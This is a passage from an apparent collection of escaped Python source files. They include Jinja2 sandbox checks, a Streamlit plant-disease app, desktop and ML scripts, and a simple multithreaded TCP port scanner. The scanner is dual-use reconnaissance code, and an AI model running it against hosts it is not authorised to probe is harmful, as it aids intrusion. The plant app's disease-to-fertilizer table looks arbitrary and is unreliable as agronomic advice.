MAX_RANGE items.\n    \"\"\"\n    rng = range(*args)\n\n    if len(rng) > MAX_RANGE:\n        raise OverflowError(\n            \"Range too big. The sandbox blocks ranges larger than\"\n            f\" MAX_RANGE ({MAX_RANGE}).\"\n        )\n\n    return rng\n\n\ndef unsafe(f: F) -> F:\n    \"\"\"Marks a function or method as unsafe.\n\n    .. code-block: python\n\n        @unsafe\n        def delete(self):\n            pass\n    \"\"\"\n    f.unsafe_callable = True  # type: ignore\n    return f\n\n\ndef is_internal_attribute(obj: t.Any, attr: str) -> bool:\n    \"\"\"Test if the attribute given is an internal python attribute.  For\n    example this function returns `True` for the `func_code` attribute of\n    python objects.  This is useful if the environment method\n    :meth:`~SandboxedEnvironment.is_safe_attribute` is overridden.\n\n    >>> from jinja2.sandbox import is_internal_attribute\n    >>> is_internal_attribute(str, \"mro\")\n    True\n    >>> is_internal_attribute(str, \"upper\")\n    False\n    \"\"\"\n    if isinstance(obj, types.FunctionType):\n        if attr in UNSAFE_FUNCTION_ATTRIBUTES:\n            return True\n    elif isinstance(obj, types.MethodType):\n        if attr in UNSAFE_FUNCTION_ATTRIBUTES or attr in UNSAFE_METHOD_ATTRIBUTES:\n            return True\n    elif isinstance(obj, type):\n        if attr == \"mro\":\n            return True\n    elif isinstance(obj, (types.CodeType, types.TracebackType, types.FrameType)):\n        return True\n    elif isinstance(obj, types.GeneratorType):\n        if attr in UNSAFE_GENERATOR_ATTRIBUTES:\n            return True\n    elif hasattr(types, \"CoroutineType\") and isinstance(obj, types.CoroutineType):\n        if attr in UNSAFE_COROUTINE_ATTRIBUTES:\n            return True\n    elif hasattr(types, \"AsyncGeneratorType\") and isinstance(\n        obj, types.AsyncGeneratorType\n    ):\n        if attr in UNSAFE_ASYNC_GENERATOR_ATTRIBUTES:\n            return True\n    return attr.startswith(\"__\")\n\n\ndef modifies_known_mutable(obj: t.Any, attr: str) -> bool:\n    \"\"\"This function checks if an attribute on a builtin mutable object\n    (list, dict, set or deque) or the corresponding ABCs would modify it\n    if called.\n\n    >>> modifies_known_mutable({}, \"clear\")\n    True\n    >>> modifies_known_mutable({}, \"keys\")\n    False\n    >>> modifies_known_mutable([], \"append\")\n    True\n    >>> modifies_known_mutable([], \"index\")\n    False\n\n    If called with an unsupported object, ``False`` is returned.\n\n    >>> modifies_known_mutable(\"foo\", \"upp",
    "import streamlit as st\nimport tensorflow as tf\nimport numpy as np\nimport cv2\nfrom tensorflow.keras.preprocessing.image import img_to_array\n\n# Load the trained model\nmodel = tf.keras.models.load_model('trained_plant_disease_model.h5')\n\n# Function to preprocess the image\ndef preprocess_image(image):\n    image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)\n    image = cv2.resize(image, (128, 128))  # Resize image to 128x128\n    image = image.astype(\"float\") / 255.0\n    image = img_to_array(image)\n    image = np.expand_dims(image, axis=0)\n    return image\n\n# Function to make predictions\ndef predict_disease(image):\n    processed_image = preprocess_image(image)\n    predictions = model.predict(processed_image)\n    result_index = np.argmax(predictions)\n    return result_index\n\n# Function to predict fertilizer based on disease\ndef predict_fertilizer(disease):\n    # Define a mapping between disease and fertilizer\n    fertilizer_mapping = {\n        'Tomato___Bacterial_spot': 'Ammonium Nitrate',\n        'Tomato___Early_blight': 'Triple Superphosphate',\n        'Tomato___Late_blight': 'Calcium Nitrate',\n        'Tomato___Leaf_mold': 'Potassium Sulfate',\n        'Tomato___Septoria_leaf_spot': 'Potassium Nitrate',\n        'Tomato___Spider_mites': 'Urea',\n        'Tomato___Target_spot': 'Diammonium Phosphate',\n        'Tomato___Yellow_leaf_curl_virus': 'Magnesium Sulfate',\n        'Potato___Bacterial_spot': 'Sulphate of Potash',\n        'Potato___Early_blight': 'Ammonium Phosphate',\n        'Potato___Late_blight': 'Potassium Chloride',\n        'Potato___Leaf_mold': 'Urea',\n        'Potato___Septoria_leaf_spot': 'Calcium Ammonium Nitrate',\n        'Potato___Spider_mites': 'Monoammonium Phosphate',\n        'Potato___Target_spot': 'Ammonium Sulfate',\n        'Potato___Yellow_leaf_curl_virus': 'Potassium Sulfate',\n        'Corn_(maize)___Cercospora_leaf_spot Gray_leaf_spot': 'Nitrogen, Phosphorus, Potassium (NPK) Fertilizer',\n        'Corn___Bacterial_spot': 'Urea',\n        'Corn___Early_blight': 'Ammonium Nitrate',\n        'Corn___Late_blight': 'Potassium Sulfate',\n        'Corn___Leaf_mold': 'Calcium Nitrate',\n        'Corn___Septoria_leaf_spot': 'Triple Superphosphate',\n        'Corn___Spider_mites': 'Diammonium Phosphate',\n        'Corn___Target_spot': 'Magnesium Sulfate',\n        'Corn___Yellow_leaf_curl_virus': 'Sulphate of Potash',\n    }\n    # Lookup the fertilizer based on the predicted disease\n    return fertilizer_mapping.get(disease, 'Unknown fertilizer')\n\n# Streamlit App\ndef main():\n    st.title(\"Plant Disease Detection App\")\n\n    # Option to upload image\n    uploaded_file = st.file_uploader(\"Upload Plant Image\", type=[\"jpg\", \"jpeg\", \"png\"])\n\n    # Load the validation set to access class names\n    validation_set = tf.keras.utils.image_dataset_from_directory(\n        'data',\n        labels=\"inferred\",\n        label_mode=\"categorical\",\n        class_names=None,\n        color_mode=\"rgb\",\n        batch_size=32,\n        image_size=(128, 128),\n        shuffle=True,\n        seed=None,\n        validation_split=None,\n        subset=None,\n        interpolation=\"bilinear\",\n        follow_links=False,\n        crop_to_aspect_ratio=False\n    )\n    class_names = validation_set.class_names\n\n    if uploaded_file is not None:\n        image = cv2.imdecode(np.frombuffer(uploaded_file.read(), np.uint8), 1)\n\n        # Center the image using columns\n        col1, col2, col3 = st.columns([1, 3, 1])\n        with col2:\n            st.image(image, caption='Uploaded Image', use_column_width=True)\n\n        # Make prediction and display result\n        if st.button(\"Classify\"):\n            st.write(\"Classified Disease\")\n            prediction = predict_disease(image)\n            class_name = class_names[prediction]\n            st.success(f\"Predicted Disease: {class_name}\")\n\n            # Predict fertilizer based on the disease\n            fertilizer = predict_fertilizer(class_name)\n            st.success(f\"Suggested Fertilizer: {fertilizer}\")\n\nif __name__ == '__main__':\n    main()\n",
    "import time\nimport subprocess\nimport json\n\nYMAX = 5  # max y value to allow switching\nSCALE = 400/1920  # distance need to travel to switch workspace\nWORKSPACE_COUNT = 7  # the number of workspace in hyprland\nSLEEP = 0.01  # sleep time between measurments\n\ndef get_mouse():\n    str = subprocess.check_output([b'hyprctl', b'cursorpos']).split(b',')\n    return int(str[0]), int(str[1])\n\n\ndef get_workspace():\n    str = subprocess.check_output(['hyprctl', 'activeworkspace'])\n    return int(str[13:14])\n\ndef get_scaled_delta_width() -> int:\n    monitors_json = subprocess.check_output([\"hyprctl\", \"monitors\", \"-j\"])\n    monitors = json.loads(monitors_json)\n    for monitor in monitors:\n        if monitor[\"focused\"]:\n            width = float(monitor[\"width\"])/float(monitor[\"scale\"])\n            return int(width*SCALE) # dynamic move distance\n\n    return int(1920*SCALE) # default scale \n\n\ndef set_workspace(pos: int):\n    if 0 < pos <= WORKSPACE_COUNT:  # limit the range of workspaces\n        subprocess.check_output(['hyprctl', 'dispatch', 'workspace', str(pos)])\n\n\nif __name__ == '__main__':\n    MOVE_DISTANCE = get_scaled_delta_width()\n    while True:\n        time.sleep(SLEEP * 4)\n        x, y = get_mouse()\n        if y <= YMAX:\n            distance = 0  # reset distance from previous movements\n            previous_x = x  # over write the last x from previous unconected movements\n            while True:\n                time.sleep(SLEEP)\n                x, y = get_mouse()\n\n                if y > YMAX:  # quit if mouse leaves the allowed area\n                    break\n                if x != previous_x:\n                    distance += x - previous_x  # add the distance just traveled\n                    previous_x = x\n                    if distance >= MOVE_DISTANCE:  # check if distance traveld is enough\n                        distance = -MOVE_DISTANCE / 2\n                        set_workspace(get_workspace() + 1)\n                    if distance <= -MOVE_DISTANCE:\n                        set_workspace(get_workspace() - 1)\n                        distance = +MOVE_DISTANCE / 2\n",
    "import os.path\nimport streamlit as st\n\nimport boto3\nbedrock = boto3.client(service_name='bedrock-runtime')\n\n# In this example, we'll use the AWS Titan Embeddings model to generate\n# embeddings. You can use any model that generates embeddings.\nfrom llama_index.embeddings.bedrock import BedrockEmbedding\nfrom llama_index.core import Settings, get_response_synthesizer\n\n# Load the Titan Embeddings using Bedrock client.\nSettings.embed_model = BedrockEmbedding(model=\"amazon.titan-embed-text-v1\",\n                                        client=bedrock)\n\n# Vector Store for Vector Embeddings\nfrom llama_index.core import (\n    VectorStoreIndex,\n    SimpleDirectoryReader,\n    StorageContext,\n    load_index_from_storage\n)\n\n# Load the Bedrock from llama_index\nfrom llama_index.llms.bedrock import Bedrock\n\nPERSIST_DIR = \"./storage\"\n\n\n# Load the PDFs from the directory and create a vector index\ndef create_index():\n    documents = SimpleDirectoryReader(\"data\").load_data()\n    index = VectorStoreIndex.from_documents(documents, show_progress=True)\n    return index\n\n\n# Load the LLM from the Bedrock\ndef load_llm():\n    llm = Bedrock(model=\"amazon.titan-text-express-v1\", client=bedrock, max_tokens=512)\n    return llm\n\n\n# Query the engine\ndef get_response(index, llm, user_question):\n    # Create a query engine with the retriever and llm\n    query_engine = index.as_query_engine(llm=llm)\n    response = query_engine.query(user_question)\n    return response\n\n\ndef streamlit_ui():\n    st.set_page_config(\"My Gita RAG\")\n    st.header(\"RAG implementation using AWS Bedrock and Llama Index\")\n\n    user_question = st.text_input(\"Ask me anything from My Gita e.g. \"\n                                  \"What is the meaning of life?\")\n\n    with st.sidebar:\n        st.title(\"Update Or Create Vector Embeddings\")\n\n        if st.button(\"Update Vector Store\"):\n            with st.spinner(\"Processing...\"):\n                index = create_index()\n                index.storage_context.persist(persist_dir=PERSIST_DIR)\n                st.success(\"Done\")\n\n    if st.button(\"Generate Response\"):\n        if not os.path.exists(PERSIST_DIR):\n            st.error(\"Please create the vector store first from the sidebar.\")\n            return\n        if not user_question:\n            st.error(\"Please enter a question.\")\n            return\n        with st.spinner(\"Processing...\"):\n            llm = load_llm()\n            storage_context = StorageContext.from_defaults(\n                persist_dir=PERSIST_DIR)\n            index = load_index_from_storage(storage_context)\n\n            st.success(get_response(index, llm, user_question))\n\n\nif __name__ == \"__main__\":\n    streamlit_ui()\n",
    "import networkx as nx\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport control as ct \n\neig = lambda A: np.linalg.eig(A)[0]\nround = lambda A: np.round(A, 3)\n\n\ndef generate_random_connected_graph(n):\n    # Create an empty graph\n    G = nx.Graph()\n\n    # Add nodes to the graph\n    G.add_nodes_from(range(0, n))\n\n    print(G.nodes)\n\n    # Connect the nodes randomly until the graph is connected\n    while not nx.is_connected(G):\n        # Choose two random nodes\n\n        node1 = np.random.randint(0, n)\n        node2 = np.random.randint(0, n)\n        \n        # Add an edge between the two nodes if it doesn't already exist\n        if not G.has_edge(node1, node2) and node1 != node2:\n            G.add_edge(node1, node2)\n\n    return G\n\ndef example_graph():\n    edges = [(0, 6), (0, 1), (1, 7), (1, 9), (2, 4), (2, 5), (3, 9), (4, 7), (5, 8), (5, 9), (6, 9), (6, 7), (7, 9)]\n    G = nx.Graph(edges)\n    return G, 10\n\ndef K4():\n    \"\"\"Complete graph with 4 nodes\"\"\"\n    edges = [(0,1),(1,2),(2,3),(0,3),(0,2),(1,3)]\n    G = nx.Graph(edges)\n    return G, 4\n\ndef C4():\n    \"\"\"Cycle graph with 4 nodes\"\"\"\n    edges = [(0,1),(1,2),(2,3),(0,3)]\n    G = nx.Graph(edges)\n    return G,4\n\ndef S4():\n    \"\"\"Star graph with 4 nodes\"\"\"\n    edges = [(0,1),(0,2),(0,3)]\n    G = nx.Graph(edges)\n    return G,4\n\ndef P4():\n    \"\"\"Path graph with 4 nodes\"\"\"\n    edges = [(0,1),(1,2),(2,3)]\n    G = nx.Graph(edges)\n    return G,4\n\nG, n = example_graph()\n\nL = nx.laplacian_matrix(G).toarray()\nI = np.eye(n)\n\nA = -L\nplt.figure()\nnx.draw(G, with_labels=True)\n\n# randomly samples 2 pairs of nodes for input-output\nwhile True:\n    i1, i2, o1, o2 = np.random.randint(0,n,4)\n    if i1 != o1 and i2 != o2:\n        break\n\nB1 = np.zeros(n)\nB1[i1] = 1\nB2 = np.zeros(n)\nB2[i2] = 1\n\nC1 = np.zeros(n)\nC1[o1] = 1\nC2 = np.zeros(n)\nC2[o2] = 1\n\nsys1 = ct.ss(A,B1,C1,0)\nsys2 = ct.ss(A,B2,C2,0)\n\nomega = np.logspace(-2, 2, 1000)\nmag, phase, _ = ct.freqresp(sys1, omega)\n\nmag1_dB = 20*np.log10(mag)\nphase1 = phase/np.pi*180\n\nmag, phase, _ = ct.freqresp(sys2, omega)\nmag2_dB = 20*np.log10(mag)\nphase2 = phase/np.pi*180\n\nplt.figure()\nplt.subplot(2,1,1)\nplt.semilogx(omega, mag1_dB, label=f\"u={i1}, y={o1}\")\nplt.semilogx(omega, mag2_dB, label=f\"u={i2}, y={o2}\")\nplt.grid()\nplt.xlabel('freq (rad/s)')\nplt.ylabel('mag (dB)')\nplt.legend()\n\nplt.subplot(2,1,2)\nplt.semilogx(omega, phase1, label=f\"u={i1}, y={o1}\")\nplt.semilogx(omega, phase2, label=f\"u={i2}, y={o2}\")\nplt.grid()\nplt.xlabel('freq (rad/s)')\nplt.ylabel('phase (deg)')\nplt.legend()\n\n\nplt.show()\n",
    "import socket\nimport argparse\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef scan_port(target_host, port):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((target_host, port))\n        if result == 0:\n            print(f\"Port {port} is open\")\n        sock.close()\n    except KeyboardInterrupt:\n        print(\"\\nExiting...\")\n        exit()\n    except socket.gaierror:\n        print(\"Hostname could not be resolved. Exiting...\")\n        exit()\n    except socket.error:\n        print(\"Couldn't connect to server\")\n        exit()\n\ndef port_scan(target_host, start_port, end_port):\n    print(f\"Scanning target: {target_host}\")\n    print(\"Scanning ports {} to {}\".format(start_port, end_port))\n    with ThreadPoolExecutor(max_workers=20) as executor:\n        for port in range(start_port, end_port + 1):\n            executor.submit(scan_port, target_host, port)\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Simple port scanner\")\n    parser.add_argument(\"host\", help=\"Target host to scan\")\n    parser.add_argument(\"start_port\", type=int, help=\"Starting port number\")\n    parser.add_argument(\"end_port\", type=int, help=\"Ending port number\")\n    args = parser.parse_args()\n\n    target_host = args.host\n    start_port = args.start_port\n    end_port = args.end_port\n\n    port_scan(target_host, start_port, end_port)\n\nif __name__ == \"__main__\":\n    main()\n",
    "import numpy as np\nfrom scipy.io.wavfile import write\nimport random\nimport os\nimport configparser  # Add this import\n\nCONFIG_FILE = 'settings.txt'  # Add this line\n# Default settings\nintro_duration = 0.2  # seconds\ntest_duration = 1.0   # seconds\nspace_duration = 1.0  # seconds\n\ndef get_current_settings():\n    return intro_duration, test_duration, space_duration\ndef midi_to_frequency(midi_note):\n    return 2 ** ((midi_note - 69) / 12) * 440\n    # A4 MIDI note is 69 and should return a frequency of 440 Hz\n    print(midi_to_frequency(69))  # Expected output: 440\n\n\ndef create_note(frequency, duration, sample_rate=44100, fade_in_duration=0.01, fade_out_duration=0.1):\n    samples = np.arange(duration * sample_rate)\n    waveform = np.sin(2 * np.pi * frequency * samples / sample_rate)\n\n    # Calculate the number of samples for fade in and fade out\n    fade_in_samples = int(fade_in_duration * sample_rate)\n    fade_out_samples = int(fade_out_duration * sample_rate)\n\n    # Ensure waveform is long enough for fade in and fade out\n    if len(waveform) > fade_in_samples + fade_out_samples:\n        fade_in = np.linspace(0, 1, fade_in_samples)\n        waveform[:fade_in_samples] *= fade_in\n\n        fade_out = np.linspace(1, 0, fade_out_samples)\n        waveform[-fade_out_samples:] *= fade_out\n    else:\n        # For very short waveforms, adjust or skip fading\n        # This example simply normalizes the waveform without fading\n        waveform = waveform * (32767 / np.max(np.abs(waveform)))\n\n    max_val = np.max(np.abs(waveform))\n    if max_val > 0:\n        waveform = waveform * (32767 / max_val)\n    waveform = np.nan_to_num(waveform).astype(np.int16)\n\n    return waveform\n\ndef set_durations(intro_dur, test_dur, space_dur):\n    return intro_dur, test_dur, space_dur\n\n\ndef load_settings():\n    config = configparser.ConfigParser()\n    try:\n        config.read(CONFIG_FILE)\n\n        try:\n            intro_speed = float(config['DEFAULT']['intro_speed'])\n            test_speed = float(config['DEFAULT']['test_speed'])\n            space_between = float(config['DEFAULT']['space_between'])\n        except ValueError:\n            print(\"Invalid settings detected. Resetting to default values.\")\n            intro_speed = 0.2\n            test_speed = 1.0\n            space_between = 1.0\n            save_settings(intro_speed, test_speed, space_between)\n\n        print(\"Settings loaded:\", intro_speed, test_speed, space_between) \n        return intro_speed, test_speed, space_between\n\n    except (KeyError, FileNotFoundError) as e:  \n        print(\"Error loading settings:\", e)\n        intro_speed = 0.2\n        test_speed = 1.0\n        space_between = 1.0\n        save_settings(intro_speed, test_speed, space_between)\n\n    return intro_speed, test_speed, space_between\n\ndef save_settings(intro_speed, test_speed, space_between):\n    config = configparser.ConfigParser()\n    config['DEFAULT'] = {\n        'intro_speed': str(intro_speed),\n        'test_speed': str(test_speed),\n        'space_between': str(space_between)\n    }\n    print(\"Saving settings...\")\n\n    with open(CONFIG_FILE, 'w') as file:\n        config.write(file)\n\n\ndef apply_settings(intro_speed_entry, test_speed_entry, space_between_entry):\n    # Get values from the Entry widgets and convert them to floats\n    intro_speed = float(intro_speed_entry.get())\n    test_speed = float(test_speed_entry.get())\n    space_between = float(space_between_entry.get())\n\n    print(\"Applying settings:\", intro_speed, test_speed, space_between)\n\n    # Update the global settings variables directly\n    global intro_duration, test_duration, space_duration\n    intro_duration = intro_speed if intro_speed else 0.2\n    test_duration = test_speed if test_speed else 1.0\n    space_duration = space_between if space_between else 1.0\n\n    # Save settings after making changes\n    save_settings(intro_duration, test_duration, space_duration)  # Pass the float values\n\n    # Now load the new settings\n    intro_speed, test_speed, space_between = load_settings() \n\n    print(\"Settings loaded:\", intro_speed, test_speed, space_between)\n\n    # Update the global settings variables directly\n    intro_duration = float(intro_speed) if intro_speed else 0.2\n    test_duration = float(test_speed) if test_speed else 1.0\n    space_duration = float(space_between) if space_between else 1.0\n\n    # Save settings after making changes\n    save_settings() \n\ndef generate_chord(root_note, duration, sample_rate=44100):\n    # Calculate frequencies for root, third, and fifth\n    root_freq = midi_to_frequency(root_note)\n    third_freq = midi_to_frequency(root_note + 4)  # Major third\n    fifth_freq = midi_to_frequency(root_note + 7)  # Perfect fifth\n    \n    # Time array\n    t = np.linspace(0, duration, int(sample_rate * duration), endpoint=False)\n    \n    # Generate sine waves for each note\n    root_wave = np.sin(2 * np.pi * root_freq * t)\n    third_wave = np.sin(2 * np.pi * third_freq * t)\n    fifth_wave = np.sin(2 * np.pi * fifth_freq * t)\n    \n    # Combin",
    "from tkinter import *\r\nfrom PIL import ImageTk, Image\r\nroot = Tk()\r\nroot.title(\"Vending Fruit Machine\")\r\nroot.iconbitmap(\"srcs/basket.ico\")\r\nvar = StringVar()\r\n\r\n#Pera Counter\r\ninserted_money = 0\r\nbought = 0\r\ntotalPrice = 0\r\n\r\n#---------------------------------------------- BUTTON FUNCTIONS----------------------------------------------\r\n#Push Button Func\r\ndef pushmoney_button():\r\n    global bought, inserted_money,totalPrice\r\n    try:\r\n        output.delete(1.0,END)\r\n        change.delete(1.0,END)\r\n        moneyin = moneydisplay.get()\r\n        totalPrice = 50 * bought\r\n        #totalPrice_display = f\"Total: {totalPrice} Pesos\"\r\n        #Naglagay ng sobra o saktong pera ang user\r\n        if float(moneyin) >= totalPrice:\r\n            #Kapag nagcocontinue ka lang ng payment, iadd yung already inserted money sa bagong inserted money\r\n            #Kapag walang already inserted money then ang sukli is ung freshly added money minus total price\r\n            sukli = (float(moneyin)+inserted_money) - totalPrice if inserted_money else float(moneyin) - totalPrice\r\n            if float(moneyin) > totalPrice: #Naglagay ng sobra ang user\r\n                change.insert(\"1.0\",(f\"change: {sukli}\"))\r\n            else: \r\n                #If sakto ung nilagay na pera without previous insert then no need to display sukli\r\n                if inserted_money:\r\n                    change.insert(\"1.0\",(f\"change: {sukli}\"))\r\n            #Di na maglalabas ng change kapag sakto ang pera\r\n            output.insert(\"2.0\", \"\\n\\n Enjoy your \\n fruit/s!\", ) #naibigay ang product\r\n            inserted_money = 0 #nakuha na ang pera\r\n            bought = 0 #reset number of bought fruits\r\n            fruit_basket.delete(1.0,END)\r\n            totalcost.delete(1.0,END)\r\n            #change.delete(1.0,END)\r\n            #b6[\"state\"] = \"disabled\"\r\n\r\n        #Naglagay ng kulang na pera ang user\r\n        elif float(moneyin) < totalPrice:\r\n            inserted_money += float(moneyin) #I-dagdag ang kulang na pera\r\n            #Nagdagdag ng kulang na pera ang user\r\n            if inserted_money < totalPrice:\r\n                kulang = totalPrice - inserted_money\r\n                change.insert(\"1.0\",(f\"please add: {kulang}\")) #nagabiso kung ilang ang kulang\r\n\r\n            #Nagdagdag ng sobra o saktong kulang na pera ang user\r\n            elif inserted_money >= totalPrice :\r\n                sukli = inserted_money - totalPrice\r\n\r\n                #Magdisplay lang ng sukli if sobra yung total inserted money kaysa sa total price\r\n                if sukli:\r\n                    change.insert(\"1.0\",(f\"change: {sukli}\"))\r\n                    inserted_money = 0 #nakuha na ang pera\r\n                    bought = 0 #reset number of bought fruits\r\n                fruit_basket.delete(1.0,END)\r\n                totalcost.delete(1.0,END)\r\n                #change.delete(1.0,END)\r\n                b6[\"state\"] = \"disabled\"\r\n                output.insert(\"2.0\", \"\\n\\n Enjoy your \\n fruit/s!\", )\r\n\r\n\r\n        moneydisplay.delete(0,100) #na-delete ang hulugan ng pera\r\n    except:\r\n            output.insert(\"2.0\",\"Error\")\r\n\r\n        #moneyin = pera na hinuhulog\r\n        #moneydisplay = doon tinatype yung pera\r\n\r\n#Reset Button Func\r\ndef reset_button ():\r\n    global inserted_money, bought\r\n    fruit_basket.delete(1.0,END)\r\n    output.delete(1.0,END)\r\n    change.delete(1.0,END)\r\n    moneydisplay.delete(0,100)\r\n    totalcost.delete(1.0,END)\r\n    inserted_money = 0\r\n    bought = 0\r\n    b1[\"state\"] = \"normal\"\r\n    b2[\"state\"] = \"normal\"\r\n    b3[\"state\"] = \"normal\"\r\n    b4[\"state\"] = \"normal\"\r\n    b5[\"state\"] = \"disabled\"\r\n    b6[\"state\"] = \"disabled\"    \r\n\r\n#Apple Button Func\r\ndef Apple_button(): #Function na nagsasabi ano mangyayari kapag pinindot ang \"apple\" button\r\n    global bought #(CLI) Matatawag ang \"bought\" variable\r\n    totalcost.delete(1.0,END) #(GUI) Madedelete ang nakalagay sa Total Price frame\r\n    bought += 1 #(CLI) Dadag-dag sa ipinamili mo\r\n    totalPrice = 50 * bought #(CLI) Mako-compute\r\n    fruit_basket.insert(\"1.0\", \"Apple = 50 Pesos\\n\") #(GUI) Malalagyan ng \"Apple = 50 Pesos\" sa \"Your Purchases\"\r\n    totalcost.insert(\"1.0\",f\"Total: {totalPrice} Pesos\") #(GUI) Ma-update ang Total Price frame\r\n    b5[\"state\"] = \"normal\" #(GUI) Iilaw ang \"Reset\" button\r\n    b6[\"state\"] = \"normal\" #(GUI) Iilaw ang \"Push\" button\r\n\r\n#Grapes Button Func\r\ndef Grapes_button():\r\n    global bought\r\n    totalcost.delete(1.0,END)\r\n    bought += 1\r\n    totalPrice = 50 * bought\r\n    fruit_basket.insert(\"1.0\", \"Grape = 50 Pesos\\n\")\r\n    totalcost.insert(\"1.0\",f\"Total: {totalPrice} Pesos\")\r\n    b5[\"state\"] = \"normal\"\r\n    b6[\"state\"] = \"normal\"\r\n\r\n#Banana Button Func\r\ndef Banana_button():\r\n    global bought\r\n    totalcost.delete(1.0,END)\r\n    bought += 1\r\n    totalPrice = 50 * bought\r\n    fruit_basket.insert(\"1.0\", \"Banana = 50 Pesos\\n\")\r\n    totalcost.insert(\"1.0\",f\"Total: {totalPrice} Pesos\")\r\n    b5[\"state\"] = \"normal\"\r\n    b6[\"state\"] = \"normal\"\r\n\r\n#Lemon Button Func\r\ndef Lemons_button():\r\n    global",
    "from news_task import NewsTasks\nfrom news_agent import NewsAgent\nfrom crewai import Crew\nfrom dotenv import load_dotenv\nimport warnings\nwarnings.filterwarnings(\"ignore\")\nload_dotenv()\n\nclass NewsCrew:\n\n    def run (self):\n        agents = NewsAgent()\n        tasks = NewsTasks()\n\n        agents_search_news = agents.searcher()\n        agents_analyze_news = agents.analyst()\n        agents_summarize_news = agents.summarizer()\n        agents_write_news = agents.writer()\n        agents_translate_news = agents.translator()\n        \n        \n        tasks_search_news = tasks.search_news(agents_search_news)\n        tasks_analyze_news = tasks.analyze_news(agents_analyze_news)\n        tasks_summarize_news = tasks.summarize_news(agents_summarize_news)\n        tasks_write_news = tasks.write_news(agents_write_news)\n        tasks_translate_news = tasks.translate_news(agents_translate_news)\n        \n        \n        crew = Crew(\n            agents = [agents_search_news, agents_analyze_news, agents_summarize_news, agents_write_news, agents_translate_news],\n            tasks = [tasks_search_news, tasks_analyze_news, tasks_summarize_news, tasks_write_news, tasks_translate_news],\n            verbose=True)\n        \n        \n        result = crew.kickoff()\n        return result\n\n\nif __name__ == '__main__':\n    news_crew = NewsCrew()\n    result = news_crew.run()\n    \n    print(\"\\n\\n########################\")\n    print(\"##  NEWS CREW RESULT  ##\")\n    print(\"########################\\n\")\n    print(result)",
    "# \u5bfc\u5165\u6240\u9700\u7684\u5e93\r\nimport numpy as np\r\nimport pandas as pd\r\nfrom sklearn.model_selection import train_test_split, GridSearchCV\r\nfrom sklearn.linear_model import LogisticRegression\r\nfrom sklearn.metrics import accuracy_score, roc_auc_score\r\nfrom sklearn.preprocessing import StandardScaler\r\nfrom sklearn.pipeline import Pipeline\r\nfrom sklearn.feature_selection import SelectKBest, f_classif\r\nfrom sklearn.impute import SimpleImputer\r\nimport matplotlib.pyplot as plt\r\nimport seaborn as sns\r\nimport matplotlib.pyplot as plt\r\n\r\n# \u8bfb\u53d6CSV\u6587\u4ef6\u4e2d\u7684\u7f51\u7403\u6bd4\u8d5b\u6570\u636e\r\ndata = pd.read_csv('processed_data.csv')\r\n\r\n# \u9009\u62e9\u7279\u5f81\u548c\u76ee\u6807\u53d8\u91cf\r\nfeatures = data[['set_score_lead','game_score_lead','streak',\r\n                 'server','serve_no','serve_width','serve_depth',\r\n                 'ace','winner','double_fault','unf_err','net_pt','net_pt_won','break_pt','break_pt_won',\r\n                 'distance_run','speed_mph','rally_count','return_depth'\r\n                 ]]\r\ntarget = data['point_victor']\r\n\r\n# \u5c06\u6240\u6709\u7279\u5f81\u8f6c\u6362\u4e3a\u6570\u503c\u578b\uff0c\u5e76\u5904\u7406\u975e\u6570\u503c\u503c\r\nfeatures = features.apply(pd.to_numeric, errors='coerce').fillna(0)\r\n\r\n# \u5bf9\u7279\u5f81\u8fdb\u884c\u6807\u51c6\u5316\r\nscaler = StandardScaler()\r\nfeatures_scaled = scaler.fit_transform(features)\r\n\r\n#\u5c06\u6570\u636e\u96c6\u5212\u5206\u4e3a\u8bad\u7ec3\u96c6\u548c\u6d4b\u8bd5\u96c6\uff0c\u968f\u673a\u5212\u5206\r\nX_train, X_test, y_train, y_test = train_test_split(features_scaled, target, test_size=0.3, random_state=10)\r\n\r\n# \u975e\u968f\u673a\u5212\u5206\r\n#split_index = int(0.7 * len(features_scaled))\r\n#X_train, X_test = features_scaled[:split_index], features_scaled[split_index:]\r\n#y_train, y_test = target[:split_index], target[split_index:]\r\n\r\n\r\n# \u521d\u59cb\u5316\u903b\u8f91\u56de\u5f52\u6a21\u578b\r\nmodel = LogisticRegression()\r\n\r\n# \u8bad\u7ec3\u6a21\u578b\r\nmodel.fit(X_train, y_train)\r\n\r\n# \u9884\u6d4b\u5e76\u8bc4\u4f30\u6a21\u578b\u51c6\u786e\u6027\r\ny_pred = model.predict(X_test)\r\naccuracy = accuracy_score(y_test, y_pred)\r\nprint(f'Model Accuracy: {accuracy * 100:.2f}%')\r\n\r\n# \u5728\u6d4b\u8bd5\u96c6\u4e0a\u8fdb\u884c\u9884\u6d4b\r\ny_pred_prob = model.predict_proba(X_test)[:, 1]  # \u83b7\u53d6\u9884\u6d4b\u6982\u7387\uff0c\u901a\u5e38\u9009\u62e9\u7b2c\u4e8c\u5217\u5373\u6b63\u7c7b\u522b\u7684\u6982\u7387\r\n\r\n# \u5c06 y_test \u548c y_pred \u8f6c\u6362\u4e3a DataFrame\r\nresult_df = pd.DataFrame({'y_test': y_test, 'y_pred': y_pred,'y_pred_prob':y_pred_prob})\r\n\r\n# \u5bfc\u51fa\u5230 CSV \u6587\u4ef6\r\nresult_df.to_csv('predictions.csv', index=False)\r\n\r\n# \u83b7\u53d6\u7cfb\u6570\u503c\u548c\u5bf9\u5e94\u7684\u56e0\u7d20\u540d\u79f0\r\ncoefficients = model.coef_[0]\r\nfeature_names = features.columns\r\n\r\n# \u521b\u5efa DataFrame \u4ee5\u4fbf\u4f7f\u7528 Seaborn \u7ed8\u56fe\r\ncoef_df = pd.DataFrame({'Feature': feature_names, 'Coefficient': coefficients})\r\n\r\n# \u6839\u636e\u7cfb\u6570\u503c\u5927\u5c0f\u6392\u5e8f\r\ncoef_df = coef_df.sort_values(by='Coefficient', ascending=False)\r\n\r\n# \u4f7f\u7528 Seaborn \u7ed8\u5236\u6761\u5f62\u56fe\r\nplt.figure(figsize=(10, 6))\r\nsns.barplot(x='Coefficient', y='Feature', data=coef_df, palette='viridis')\r\nplt.title('Logistic Regression Coefficients')\r\nplt.xlabel('Coefficient Value')\r\nplt.show()\r\n\r\n# \u5c06\u7cfb\u6570\u6570\u636e\u4fdd\u5b58\u5230 CSV \u6587\u4ef6\r\ncoef_df.to_csv('logistic_regression_coefficients.csv', index=False)\r\n",
